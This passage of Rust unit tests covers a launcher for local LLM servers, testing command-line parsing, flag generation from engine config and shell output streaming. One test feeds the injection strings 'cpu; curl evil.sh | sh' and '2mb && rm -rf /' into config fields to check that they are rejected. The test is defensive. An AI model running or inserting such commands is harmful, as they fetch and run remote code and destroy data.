                ("big-Q8_0".to_string(), Some(8331)),
                ("eq-form".to_string(), Some(9999)),
            ]
        );
        // A llama-server line parses under its own port flag.
        let llamacpp_lines =
            vec!["127 llama-server --model /models/llm.gguf --port 8082".to_string()];
        let llamacpp =
            parse_server_cmdlines(&llamacpp_lines, &["--model", "-m"], &["--port"], 8080);
        assert_eq!(llamacpp, vec![("llm".to_string(), Some(8082))]);
    }

    #[test]
    fn running_server_parse_defaults_port() {
        let lines = vec!["9 joshua serve --model /models/no-addr.gguf".to_string()];
        let parsed = parse_server_cmdlines(&lines, &["--model", "-m"], &["--addr", "-a"], 8080);
        assert_eq!(parsed, vec![("no-addr".to_string(), Some(8080))]);
    }

    #[test]
    fn joshua_serve_flags_cover_the_typed_parameters() {
        let cfg = EngineConfig {
            context_length: Some(8192),
            device: Some("cuda".into()),
            huge_pages: Some("2mb".into()),
            mmap: true,
            lazy_weights: true,
            max_output_tokens: Some(1024),
            max_concurrency: Some(2),
            ..Default::default()
        };
        assert_eq!(
            joshua_serve_flags(&cfg),
            vec![
                "--n-ctx".to_string(),
                "8192".to_string(),
                "--device".to_string(),
                "cuda".to_string(),
                "--huge-pages".to_string(),
                "2mb".to_string(),
                "--mmap".to_string(),
                "--lazy-weights".to_string(),
                "--max-output-tokens".to_string(),
                "1024".to_string(),
                "--max-concurrency".to_string(),
                "2".to_string(),
            ]
        );
        // "off" huge pages and an unset device emit nothing.
        let minimal = EngineConfig {
            huge_pages: Some("off".into()),
            ..Default::default()
        };
        assert_eq!(joshua_serve_flags(&minimal), Vec::<String>::new());
    }

    #[test]
    fn joshua_serve_flags_drop_invalid_freeform_values() {
        // device/huge_pages are free-form config strings that end up in a
        // shell command; anything Joshua does not accept must be dropped,
        // never interpolated.
        let cfg = EngineConfig {
            device: Some("cpu; curl evil.sh | sh".into()),
            huge_pages: Some("2mb && rm -rf /".into()),
            context_length: Some(4096),
            ..Default::default()
        };
        assert_eq!(
            joshua_serve_flags(&cfg),
            vec!["--n-ctx".to_string(), "4096".to_string()]
        );
    }
}

#[cfg(test)]
mod stream_shell_tests {
    use super::*;

    #[tokio::test]
    async fn streams_lines_and_returns_full_output() {
        let (tx, mut rx) = tokio::sync::mpsc::channel(16);
        let out = stream_shell("printf 'one\\ntwo\\nthree\\n'", "test", Some(&tx))
            .await
            .expect("script succeeds");
        drop(tx);

        let mut streamed = Vec::new();
        while let Some(p) = rx.recv().await {
            streamed.push(p.status);
        }
        assert_eq!(streamed, vec!["one", "two", "three"]);
        assert_eq!(out, "one\ntwo\nthree");
    }

    #[tokio::test]
    async fn failure_includes_output_in_error() {
        // No sink: still runs, and a non-zero exit surfaces the output.
        let err = stream_shell("echo boom; exit 3", "test", None)
            .await
            .expect_err("non-zero exit is an error");
        assert!(err.to_string().contains("boom"), "got: {err}");
    }

    #[tokio::test]
    async fn works_without_a_sink() {
        let out = stream_shell("echo hello", "test", None)
            .await
            .expect("script succeeds");
        assert_eq!(out, "hello");
    }
}
